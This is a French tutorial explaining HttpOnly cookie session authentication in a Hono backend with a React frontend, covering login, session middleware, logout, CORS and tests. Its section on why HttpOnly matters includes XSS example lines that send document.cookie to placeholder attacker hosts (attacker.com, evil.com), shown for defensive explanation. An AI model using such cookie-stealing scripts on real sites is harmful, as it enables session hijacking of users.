# 🔐 Flow d'Authentification Complet avec Cookies HttpOnly

Guide détaillé du mécanisme d'authentification par cookies sécurisés.

---

## 📋 Table des matières

1. [Vue d'ensemble](#vue-densemble)
2. [Flow de connexion (POST /auth/login)](#flow-de-connexion)
3. [Accès à une route protégée (GET /auth/me)](#accès-à-une-route-protégée)
4. [Déconnexion (POST /auth/logout)](#déconnexion)
5. [Pourquoi HttpOnly ?](#pourquoi-httponly)
6. [Pourquoi credentials: 'include' ?](#pourquoi-credentials-include)
7. [Tests : Pourquoi get("Set-Cookie") ?](#tests-pourquoi-getset-cookie)
8. [Configuration CORS](#configuration-cors)

---

## Vue d'ensemble

### Le principe

Au lieu d'envoyer un token JWT dans le corps de la réponse que le frontend devrait stocker (localStorage/sessionStorage), on utilise un **cookie HttpOnly** qui :

- ✅ Est géré automatiquement par le navigateur
- ✅ Ne peut pas être lu par JavaScript (protection XSS)
- ✅ Est envoyé automatiquement à chaque requête
- ✅ A une date d'expiration gérée côté serveur

### Les acteurs

```
┌─────────────┐         ┌─────────────┐         ┌──────────────┐
│   Frontend  │────────>│  Navigateur │────────>│   Backend    │
│ (React)     │         │             │         │ (Hono/Node)  │
└─────────────┘         └─────────────┘         └──────────────┘
   Code JS                Gère cookies            Valide session
```

---

## Flow de connexion

### 1️⃣ L'utilisateur soumet le formulaire

**Frontend (React/Next.js) :**

```typescript
async function login(email: string, password: string) {
  const response = await fetch("http://localhost:3000/auth/login", {
    method: "POST",
    credentials: "include", // 🔑 CRUCIAL : Indique d'accepter les cookies
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email, password }),
  });

  const data = await response.json();
  // data = { success: true, data: { user: {...} } }
  // ⚠️ Pas de "sid" dans le JSON ! Le sid est dans les headers HTTP

  return data.data.user;
}
```

**Ce qui part sur le réseau :**

```http
POST /auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Origin: http://localhost:5173

{
  "email": "test@test.com",
  "password": "TestPass123!"
}
```

---

### 2️⃣ Le backend valide et crée une session

**Backend (routes.ts) :**

```typescript
authRoutes.post("/login", async (c) => {
  const { email, password } = parseResult.data;

  // 1. Valide les credentials
  const result = await loginUser(db, email, password);
  // result = {
  //   success: true,
  //   data: {
  //     sid: "abc123def456...",  ← Session ID généré
  //     user: { userId, email }
  //   }
  // }

  // 2. Envoie le cookie avec le sid
  setCookie(c, "sid", result.data.sid, cookieOptions(env));
  //         ↓
  // Génère un header HTTP : Set-Cookie: sid=abc123...; HttpOnly; Secure; ...

  // 3. Retourne le user (sans le sid)
  return c.json({ success: true, data: { user: result.data.user } }, 200);
});
```

**Service (service.ts) :**

```typescript
export async function loginUser(db: Database, email: string, password: string) {
  // 1. Trouve l'utilisateur
  const user = await db.query.users.findFirst(...);

  // 2. Vérifie le mot de passe
  const isValid = await verify(user.passwordHash, password);

  // 3. Crée une session
  const sid = crypto.randomUUID(); // "abc123-def456-..."
  const sidHash = hashSid(sid);    // SHA-256 pour sécurité

  await db.insert(sessions).values({
    sidHash,
    userId: user.userId,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 jours
  });

  return ok({ sid, user });
}
```

**Fonction cookieOptions (utils.ts) :**

```typescript
export const cookieOptions = (env: Env) => ({
  httpOnly: true, // JavaScript ne peut pas lire
  secure: env.NODE_ENV === "production", // HTTPS uniquement en prod
  sameSite: "Lax" as const, // Protection CSRF
  maxAge: 30 * 24 * 60 * 60, // 30 jours (en secondes)
  path: "/", // Valide pour toutes les routes
});
```

---

### 3️⃣ Le backend répond

**Réponse HTTP complète :**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: sid=abc123def456789; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000

{
  "success": true,
  "data": {
    "user": {
      "userId": "user_123",
      "email": "test@test.com"
    }
  }
}
```

**Décortiquons le header Set-Cookie :**

```
Set-Cookie: sid=abc123def456789; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
            ↑                    ↑       ↑         ↑       ↑            ↑
            │                    │       │         │       │            └─ Expire dans 30 jours
            │                    │       │         │       └─ Protection CSRF modérée
            │                    │       │         └─ Envoyé uniquement en HTTPS (prod)
            │                    │       └─ JavaScript ne peut pas lire ce cookie
            │                    └─ Valide pour toutes les routes du site
            └─ Nom=Valeur du cookie
```

---

### 4️⃣ Le navigateur reçoit et stocke

**Ce que fait le navigateur automatiquement :**

```javascript
// ⚠️ Tout ça est AUTOMATIQUE, tu n'écris PAS ce code !

// 1. Le navigateur lit le header Set-Cookie
const setCookieHeader = response.headers.get("Set-Cookie");

// 2. Il parse les instructions
const cookie = {
  name: "sid",
  value: "abc123def456789",
  httpOnly: true, // Je ne laisserai pas JS le lire
  secure: true, // Je ne l'enverrai qu'en HTTPS
  sameSite: "Lax", // Protection CSRF
  maxAge: 2592000, // J'expire dans 30 jours
  path: "/", // Je l'envoie pour toutes les routes
  domain: "localhost", // Valide pour ce domaine
};

// 3. Il le stocke dans son "cookie jar" (stockage interne)
// Tu ne peux pas y accéder via JavaScript !

// 4. Vérifie que credentials: 'include' était présent
// Sinon il rejette le cookie
```

**Vérification dans DevTools :**

```
Application → Cookies → http://localhost:3000
┌──────┬─────────────────┬──────────┬──────────┬─────────────┐
│ Name │ Value           │ HttpOnly │ Secure   │ SameSite    │
├──────┼─────────────────┼──────────┼──────────┼─────────────┤
│ sid  │ abc123def456789 │ ✓        │ ✓        │ Lax         │
└──────┴─────────────────┴──────────┴──────────┴─────────────┘
```

**Ce que tu NE PEUX PAS faire côté frontend :**

```javascript
// ❌ Ça ne marchera PAS
console.log(document.cookie);        // N'affiche pas "sid" (HttpOnly)
localStorage.setItem('sid', ...);    // Pas nécessaire, navigateur gère
sessionStorage.setItem('sid', ...);  // Idem
```

---

## Accès à une route protégée

### 1️⃣ Le frontend fait une requête

**Frontend :**

```typescript
async function getProfile() {
  const response = await fetch("http://localhost:3000/auth/me", {
    credentials: "include", // 🔑 Indique d'envoyer les cookies
  });

  return await response.json();
}
```

**Requête HTTP envoyée :**

```http
GET /auth/me HTTP/1.1
Host: localhost:3000
Cookie: sid=abc123def456789
```

**Ce qui s'est passé automatiquement :**

```
Frontend fait fetch()
     ↓
Navigateur voit "credentials: include"
     ↓
Navigateur cherche dans son cookie jar
     ↓
Trouve: sid=abc123def456789 (valide pour localhost:3000)
     ↓
Ajoute automatiquement le header "Cookie: sid=..."
     ↓
Envoie la requête
```

---

### 2️⃣ Le middleware vérifie l'authentification

**Backend (middleware.ts) :**

```typescript
export const requireAuth = async (c: Context<AppEnv>, next: Next) => {
  const db = c.get("db");

  // 1. Récupère le cookie "sid" de la requête
  const sid = getCookie(c, "sid");
  // sid = "abc123def456789" ou undefined

  if (!sid) {
    // Pas de cookie = pas connecté
    return c.json(err("unauthorized"), 401);
  }

  // 2. Hash le sid pour chercher en DB
  const sidHash = hashSid(sid);
  // sidHash = "e3b0c44298fc1c..." (SHA-256)

  // 3. Vérifie que la session existe et n'est pas expirée
  const session = await findValidSessionBySidHash(db, sidHash);

  if (!session) {
    // Session invalide ou expirée
    return c.json(err("unauthorized"), 401);
  }

  // 4. Met à jour le lastSeenAt (asynchrone)
  updateLastSeen(db, sidHash).catch((err) =>
    console.error("Failed to update lastSeenAt:", err)
  );

  // 5. Stocke userId dans le contexte pour la route
  c.set("session", session);
  c.set("userId", session.userId);

  // 6. Continue vers la route
  await next();
};
```

**Service de session (session.service.ts) :**

```typescript
export async function findValidSessionBySidHash(db: Database, sidHash: string) {
  const session = await db.query.sessions.findFirst({
    where: and(
      eq(sessions.sidHash, sidHash),
      gt(sessions.expiresAt, new Date()), // Non expirée
      isNull(sessions.revokedAt) // Non révoquée
    ),
  });

  return session || null;
}
```

---

### 3️⃣ La route répond

**Backend (routes.ts) :**

```typescript
authRoutes.get("/me", requireAuth, async (c) => {
  const db = c.get("db");
  const userId = c.get("userId")!; // Mis par le middleware

  // 1. Récupère le profil
  const result = await getProfile(db, userId);

  if (!isApiSuccess(result)) {
    return c.json(result, errorToStatus(result.error, authErrorMapping));
  }

  // 2. Retourne le profil
  return c.json(result, 200);
});
```

**Réponse HTTP :**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "data": {
    "userId": "user_123",
    "email": "test@test.com",
    "username": "john_doe",
    "avatarUrl": null,
    "bio": null
  }
}
```

**Schéma du flow complet :**

```
┌──────────┐                    ┌────────────┐                  ┌──────────┐
│ Frontend │                    │ Navigateur │                  │ Backend  │
└────┬─────┘                    └─────┬──────┘                  └────┬─────┘
     │                                │                               │
     │ fetch('/me', {credentials})    │                               │
     ├───────────────────────────────>│                               │
     │                                │  GET /me                      │
     │                                │  Cookie: sid=abc123           │
     │                                ├──────────────────────────────>│
     │                                │                               │
     │                                │                   [middleware]│
     │                                │                   getCookie() │
     │                                │                   validate    │
     │                                │                   set userId  │
     │                                │                               │
     │                                │                        [route]│
     │                                │                   getProfile()│
     │                                │                               │
     │                                │  200 + profile                │
     │                                │<──────────────────────────────┤
     │  Response avec data            │                               │
     │<───────────────────────────────┤                               │
     │                                │                               │
```

---

## Déconnexion

### 1️⃣ Le frontend demande la déconnexion

**Frontend :**

```typescript
async function logout() {
  await fetch("http://localhost:3000/auth/logout", {
    method: "POST",
    credentials: "include", // Envoie le cookie pour identifier la session
  });

  // Redirige vers /login
  window.location.href = "/login";
}
```

---

### 2️⃣ Le backend révoque la session

**Backend (routes.ts) :**

```typescript
authRoutes.post("/logout", async (c) => {
  const db = c.get("db");
  const sid = getCookie(c, "sid");

  if (!sid) {
    // Pas de session = déjà déconnecté
    return c.json(ok(null, "Already disconnected"), 200);
  }

  const sidHash = hashSid(sid);

  try {
    // 1. Marque la session comme révoquée en DB
    await revokeSession(db, sidHash);
  } catch (e) {
    // On log mais on continue (client = déconnecté quand même)
    console.error("Logout - session not found:", e);
  }

  // 2. Supprime le cookie côté client
  deleteCookie(c, "sid");

  return c.json(ok(null, "Disconnected"), 200);
});
```

**Service de session :**

```typescript
export async function revokeSession(db: Database, sidHash: string) {
  await db
    .update(sessions)
    .set({ revokedAt: new Date() })
    .where(eq(sessions.sidHash, sidHash));
}
```

---

### 3️⃣ Le navigateur supprime le cookie

**Réponse HTTP :**

```http
HTTP/1.1 200 OK
Set-Cookie: sid=; Path=/; HttpOnly; Max-Age=0
Content-Type: application/json

{
  "success": true,
  "data": null,
  "message": "Disconnected"
}
```

**Ce que fait `deleteCookie()` :**

```typescript
// Envoie un cookie avec Max-Age=0 pour le supprimer
Set-Cookie: sid=; Path=/; HttpOnly; Max-Age=0
                                     ↑
                              Expire immédiatement
```

**Le navigateur :**

```
Reçoit Set-Cookie avec Max-Age=0
     ↓
Supprime le cookie de son stockage
     ↓
Prochaines requêtes : pas de Cookie header
```

---

## Pourquoi HttpOnly ?

### Sans HttpOnly (DANGEREUX ❌)

```typescript
// Cookie sans HttpOnly
Set-Cookie: sid=abc123; Path=/

// JavaScript peut le lire
const cookies = document.cookie; // "sid=abc123"
const sid = cookies.split('sid=')[1];

// Un script malveillant (XSS) peut le voler
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ stolenCookie: document.cookie })
});
```

**Scénario d'attaque XSS :**

```html
<!-- Un attaquant injecte ce script -->
<script>
  // Vol du cookie de session
  fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>
```

---

### Avec HttpOnly (SÉCURISÉ ✅)

```typescript
// Cookie avec HttpOnly
Set-Cookie: sid=abc123; Path=/; HttpOnly

// JavaScript ne peut PAS le lire
console.log(document.cookie); // "" (vide, ou autres cookies non-HttpOnly)

// Un script XSS ne peut PAS le voler
fetch('https://attacker.com/steal', {
  body: document.cookie // Ne contient pas "sid"
});
```

**Protection :**

```
Script malveillant essaie d'accéder au cookie
     ↓
Navigateur: "Non, ce cookie est HttpOnly"
     ↓
Script reçoit undefined/vide
     ↓
Attaque échouée ✅
```

### Tableau comparatif

| Aspect                   | Sans HttpOnly | Avec HttpOnly |
| ------------------------ | ------------- | ------------- |
| **JavaScript peut lire** | ✅ Oui        | ❌ Non        |
| **XSS peut voler**       | ✅ Oui        | ❌ Non        |
| **Navigateur envoie**    | ✅ Oui        | ✅ Oui        |
| **Sécurité**             | ❌ Faible     | ✅ Forte      |

---

## Pourquoi `credentials: 'include'` ?

### Comportement par défaut (sans credentials)

```typescript
// Sans credentials
fetch("http://localhost:3000/auth/login", {
  method: "POST",
  // credentials: 'omit' par défaut en cross-origin
});
```

**Ce qui se passe :**

```
Frontend (localhost:5173) → Backend (localhost:3000)
     ↓
Navigateur: "Cross-origin detected"
     ↓
Navigateur: "credentials non spécifié = je bloque les cookies"
     ↓
Cookie Set-Cookie reçu mais IGNORÉ
     ↓
Requête suivante : pas de Cookie header envoyé
```

---

### Avec `credentials: 'include'`

```typescript
fetch("http://localhost:3000/auth/login", {
  method: "POST",
  credentials: "include", // 🔑 CRUCIAL
});
```

**Ce qui se passe :**

```
Frontend (localhost:5173) → Backend (localhost:3000)
     ↓
Navigateur: "credentials: include détecté"
     ↓
Navigateur: "OK, j'accepte les cookies cross-origin"
     ↓
Cookie Set-Cookie reçu et STOCKÉ
     ↓
Requête suivante : Cookie header envoyé automatiquement
```

### Les 3 valeurs possibles

```typescript
credentials: "omit"; // Jamais envoyer/accepter de cookies
credentials: "same-origin"; // Seulement si même origine (même domaine)
credentials: "include"; // Toujours envoyer/accepter (même cross-origin)
```

### Cas d'usage

| Situation                               | Valeur          | Explication                |
| --------------------------------------- | --------------- | -------------------------- |
| Frontend et Backend même domaine        | `'same-origin'` | Suffisant, plus restrictif |
| Frontend et Backend domaines différents | `'include'`     | Nécessaire pour cookies    |
| API publique sans auth                  | `'omit'`        | Pas de cookies nécessaires |

**Ton cas :**

```
Frontend: http://localhost:5173
Backend:  http://localhost:3000
          ↑
    Différents ports = cross-origin
          ↓
    credentials: 'include' OBLIGATOIRE
```

---

## Tests : Pourquoi `get("Set-Cookie")` ?

### Le problème dans les tests

```typescript
// Dans un test
const loginRes = await app.request("/auth/login", {
  method: "POST",
  body: JSON.stringify({ email, password }),
});

// ❌ Le "navigateur" n'existe pas dans les tests
// Les cookies ne sont pas gérés automatiquement
```

**Différence navigateur vs tests :**

| Environnement  | Gestion cookies                 |
| -------------- | ------------------------------- |
| **Navigateur** | Automatique (stockage + renvoi) |
| **Tests**      | Manuelle (tu dois simuler)      |

---

### Solution : Simuler le comportement du navigateur

```typescript
it("should return user profile when authenticated", async () => {
  // 1️⃣ LOGIN - Le backend envoie Set-Cookie
  const loginRes = await app.request("/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "test@test.com", password: "TestPass123!" }),
  });

  // 2️⃣ RÉCUPÈRE le cookie que le serveur a envoyé
  const cookies = loginRes.headers.get("Set-Cookie");
  // cookies = "sid=abc123; Path=/; HttpOnly; ..."

  // 3️⃣ RENVOIE le cookie (simule le navigateur)
  const meRes = await app.request("/auth/me", {
    headers: {
      Cookie: cookies || "", // ✅ Tu "remets" le cookie
    },
  });

  expect(meRes.status).toBe(200);
});
```

### Schéma du flow de test

```
TEST                              APP (Hono)
  │                                  │
  ├─── POST /login ─────────────────>│
  │                                  │ setCookie(c, "sid", ...)
  │<─── Set-Cookie: sid=abc123 ──────┤
  │                                  │
  │ const cookies = res.headers.get("Set-Cookie")
  │ cookies = "sid=abc123; ..."
  │                                  │
  ├─── GET /me ─────────────────────>│
  │    Cookie: sid=abc123            │ getCookie(c, "sid")
  │                                  │ → valide session
  │<─── 200 + profile ───────────────┤
  │                                  │
```

### Pourquoi `get("Set-Cookie")` spécifiquement ?

```typescript
// Le backend a fait ça
setCookie(c, "sid", "abc123", options);

// Ça a généré ce header HTTP
response.headers.set("Set-Cookie", "sid=abc123; Path=/; HttpOnly; ...");

// Dans le test, on le récupère
const cookies = response.headers.get("Set-Cookie");
//                                 ↑
//                        Nom exact du header HTTP
```

**Headers HTTP disponibles :**

```typescript
loginRes.headers.get("Content-Type"); // "application/json"
loginRes.headers.get("Set-Cookie"); // "sid=abc123; ..."
loginRes.headers.get("X-Custom"); // Autre header custom
```

---

## Configuration CORS

### Pourquoi CORS est nécessaire

```
Frontend (localhost:5173) veut accéder à Backend (localhost:3000)
     ↓
Navigateur: "Cross-Origin Request detected"
     ↓
Navigateur: "Je vérifie si le serveur autorise ça"
     ↓
Backend doit répondre avec headers CORS appropriés
```

### Configuration Hono

```typescript
import { cors } from "hono/cors";

app.use(
  "/*",
  cors({
    origin: "http://localhost:5173", // Ton frontend
    credentials: true, // ✅ Autorise les cookies
    allowedHeaders: ["Content-Type"], // Headers acceptés
    methods: ["GET", "POST", "PUT", "DELETE"], // Méthodes acceptées
  })
);
```

### Headers CORS générés

```http
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type
```

### Règles importantes

```typescript
// ❌ INTERDIT avec credentials: true
cors({
  origin: "*", // Wildcard interdit
  credentials: true, // Avec credentials
});

// ✅ CORRECT avec credentials: true
cors({
  origin: "http://localhost:5173", // Origine spécifique
  credentials: true,
});
```

### En production

```typescript
cors({
  origin: process.env.FRONTEND_URL || "https://myapp.com",
  credentials: true,
});
```

---

## 📊 Récapitulatif Visuel Complet

```
┌─────────────────────────────────────────────────────────────────┐
│                    FLOW D'AUTHENTIFICATION                      │
└─────────────────────────────────────────────────────────────────┘

1️⃣ LOGIN
─────────
Frontend                 Navigateur               Backend
   │                         │                       │
   │ fetch(login, {cred})    │                       │
   ├────────────────────────>│                       │
   │                         │ POST /login           │
   │                         ├──────────────────────>│
   │                         │                       │
   │                         │              validate │
   │                         │              create session
   │                         │              sidHash → DB
   │                         │                       │
   │                         │ Set-Cookie: sid=XYZ   │
   │                         │<──────────────────────┤
   │                         │ 200 + user            │
   │ response.json()         │                       │
   │<────────────────────────┤                       │
   │                         │                       │
   │                    [Stocke cookie]              │
   │                    sid=XYZ (HttpOnly)           │


2️⃣ REQUÊTE PROTÉGÉE (/me)
──────────────────────────
Frontend                 Navigateur               Backend
   │                         │                       │
   │ fetch(/me, {cred})      │                       │
   ├────────────────────────>│                       │
   │                    [Lit cookie jar]             │
   │                    sid=XYZ trouvé               │
   │                         │                       │
   │                         │ GET /me               │
   │                         │ Cookie: sid=XYZ       │
   │                         ├──────────────────────>│
   │                         │                       │
   │                         │            [middleware]
   │                         │            getCookie()
   │                         │            hash(sid)
   │                         │            DB: session?
   │                         │            set userId
   │                         │                       │
   │                         │                [route]
   │                         │            getProfile()
   │                         │                       │
   │                         │ 200 + profile         │
   │ response.json()         │<──────────────────────┤
   │<────────────────────────┤                       │


3️⃣ LOGOUT
─────────
Frontend                 Navigateur               Backend
   │                         │                       │
   │ fetch(logout, {cred})   │                       │
   ├────────────────────────>│                       │
   │                         │ POST /logout          │
   │                         │ Cookie: sid=XYZ       │
   │                         ├──────────────────────>│
   │                         │                       │
   │                         │            getCookie()
   │                         │            revokeSession()
   │                         │            deleteCookie()
   │                         │                       │
   │                         │ Set-Cookie: sid=; Max-Age=0
   │                         │<──────────────────────┤
   │                         │ 200                   │
   │                    [Supprime cookie]            │
   │                    sid n'existe plus            │
   │<────────────────────────┤                       │
```

---

## 🎯 Points clés à retenir

### HttpOnly

- ✅ **Sécurise** : JavaScript ne peut pas lire le cookie
- ✅ **Automatique** : Le navigateur gère tout
- ✅ **Protection XSS** : Les scripts malveillants ne peuvent pas voler le cookie

### credentials: 'include'

- ✅ **Nécessaire** en cross-origin pour accepter/envoyer des cookies
- ✅ **Frontend et Backend** doivent être configurés
- ✅ **CORS** doit autoriser `credentials: true`

### Tests

- ✅ **Simuler le navigateur** : Récupérer `Set-Cookie` et renvoyer `Cookie`
- ✅ **Pas de gestion automatique** dans les tests
- ✅ **Manuel** : Extraire et injecter les cookies

### Sécurité

- ✅ **Cookie HttpOnly** : Protection XSS
- ✅ **Secure** : HTTPS uniquement en production
- ✅ **SameSite** : Protection CSRF
- ✅ **Hash du sid** : Stocké en DB hashé (SHA-256)

---

## 🔗 Ressources

- [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN - Fetch credentials](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials)
- [OWASP - Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Hono - Cookies](https://hono.dev/helpers/cookie)
